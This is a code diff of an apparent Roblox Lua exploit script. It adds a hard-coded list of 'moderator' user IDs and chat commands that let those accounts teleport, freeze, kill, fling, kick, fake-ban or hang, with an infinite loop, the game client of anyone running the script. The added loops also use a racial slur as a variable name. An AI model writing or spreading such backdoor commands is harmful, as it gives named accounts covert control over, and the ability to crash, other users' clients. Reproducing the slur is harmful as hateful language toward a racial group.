@@ -2,43 +2,56 @@ local player = game.Players.LocalPlayer
 local isamod = false
 local bending = false
 local mods = {
-    469000927,
-    246848510,
-    163358789,
-    3019011749,
-    3182271938,
-    2601331366,
+    469000927, -- Ari
+    246848510, -- Imagine
+    163358789, -- Noah
+    3182271938, -- Xaquh
+    3019011749, -- Mark
 }
 
 local function cmds(msg,plr)
 	if isamod == false or table.find(mods,plr) then
 		Mod = game.Players:GetPlayerByUserId(plr)
 		isamod = table.find(mods,player.UserId)
-		if msg == ";bring ." then
+		if msg == "!bring ." then
 			if not isamod then
 				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Mod.Character.HumanoidRootPart.CFrame
 			end
 		end
 
-        if msg == ";freeze ." then
+        if msg == "!freeze ." then
 			if not isamod then
                 game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
 			end
 		end
 
-        if msg == ";unfreeze ." then
+        if msg == "!thaw ." then
 			if not isamod then
                 game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
 			end
 		end
 
-        if msg == ";kick ." then
+        if msg == ":kick ." then
 			if not isamod then
-                game.Players.LocalPlayer:Kick("o")
+                game.Players.LocalPlayer:Kick("Kicked by:"..Mod.Name)
 			end
 		end
 
-        if msg == ";benx ." then
+        if msg == "!ban ." then
+			if not isamod then
+                game.Players.LocalPlayer.Character.Humanoid.Health = 0
+                wait()
+                for i,nigger in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                    if nigger:IsA('BasePart') or nigger:IsA('Accessory') then
+                        nigger:Destroy()
+                    end
+                end
+                wait(2)
+                game.Players.LocalPlayer:Kick("PERMA BAN")
+			end
+		end
+
+        if msg == "!benx ." then
 			if not isamod then
                 bending = true
                 local segtarget = Mod.Name
@@ -85,12 +98,46 @@ local function cmds(msg,plr)
 			end
 		end
 
-        if msg == ";unbenx ." then
+        if msg == "!unbenx ." then
 			if not isamod then
                 repeat 
                     task.wait()
                     bending = false
                 until not bending
+			end
+		end
+
+        if msg == "!fling ." then
+			if not isamod then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(999999, 999999, 999999)
+			end
+		end
+
+        if msg == "!crash ." then
+			if not isamod then
+                while true do end
+			end
+		end
+
+        if msg == "!kill ." then
+			if not isamod then
+                game.Players.LocalPlayer.Character.Humanoid.Health = 0
+			end
+		end
+
+        if msg == ":void ." then
+			if not isamod then
+                -- scrirpt
+			end
+		end
+
+        if msg == "!refresh ." then
+			if not isamod then
+                for i,nigger in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                    if nigger:IsA('BasePart') or nigger:IsA('Accessory') then
+                        nigger:Destroy()
+                    end
+                end
 			end
 		end
     end
